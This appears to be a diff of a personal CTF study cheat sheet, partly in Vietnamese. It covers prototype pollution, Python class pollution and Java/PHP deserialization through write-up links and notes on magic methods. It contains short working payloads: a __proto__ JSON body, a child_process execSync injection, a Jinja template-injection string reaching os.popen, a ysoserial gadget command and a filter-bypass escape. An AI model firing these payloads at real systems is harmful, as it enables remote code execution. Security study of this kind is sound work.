@@ -1,18 +1,22 @@
+https://nhattruong.blog/2023/10/01/lo-hong-prototype-pollution-o-nhiem-nguyen-mau-toan-tap/
 ---------------------------------prototype pollution
 Content-Type: application/json
 {"password":"admin","__proto__":{"username":"admin"}}
 ["require('child_process').execSync('ls -la)"]
 https://sheon.hashnode.dev/web-hacking-prototype-pollution-attack
 https://sheon.hashnode.dev/ctf-imaginary-2022-web-category-login-please-write-up
-https://hackmd.io/@taidh/PWN2WIN-2021
+https://hackmd.io/@taidh/PWN2WIN-2021       #outputFunctionName
 https://hackmd.io/@endy/S1ZrLClOs   high level
 unflatten
 merge
 
+https://hackmd.io/@CP04042K/rkPZgkAes     #unflatten
+Prototype pollution -> AST Injection -> RCE
 --------------------Prototype + cmdi = RCE
 https://hackmd.io/@endy/B1C24TlOj
 ----python
 https://viblo.asia/p/ban-da-biet-ve-lo-hong-class-pollution-trong-python-hay-chua-p1-3kY4g5zxLAe
+https://viblo.asia/p/ban-da-biet-ve-lo-hong-class-pollution-trong-python-hay-chua-p2-MkNLr13aJgA
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
 --------------------------------------------deserialize
 https://hackmd.io/@endy/r1sYTUYOh  
@@ -24,9 +28,15 @@ java -jar ysoserial-all.jar CommonsCollections5 'apt install curl -y' | base64 -
 https://hackmd.io/@endy/SJsTmhaIs
 PHP sẽ không dùng dấu . để gọi tới private(protected) property như hiển thị ở trên mà PHP sẽ dùng \0
 
+https://hackmd.io/@onsra03/SJ7CASwRh
 https://hackmd.io/@devme4f/BJqaWika3#BadAttributeValueExpException-solution
 https://hackmd.io/@endy/B1zOJfSTh
+https://viblo.asia/p/writeup-waf-deser-so-khao-ascis-2022-by-dnm-msec-adc-2oKLn2laLQO
+----------------------------bypass filter
+https://testbnull.medium.com/old-men-play-sv-attt-writeup-for-isolate-challenge-5e9cd7fe9abe
+@type   \u0040type
 
+unserialize -> __destruct
 Ngoài readObject(), chúng ta cũng nên tìm thêm:
 readResolve()
 toString()
@@ -34,6 +44,7 @@ hashCode()
 finalize()
 ---------------php deser
 https://hackmd.io/@Trumpiter/basicvulnweb   --systemclass
+https://hackmd.io/@CP04042K/ryyqJeXx2#SpyBug
 __call() is triggered when invoking inaccessible methods in an object context.
 __sleep() sẽ được gọi khi chúng ta thực hiện serialize() đối tượng
 __wakeup() sẽ được gọi khi chúng ta unserialize() 
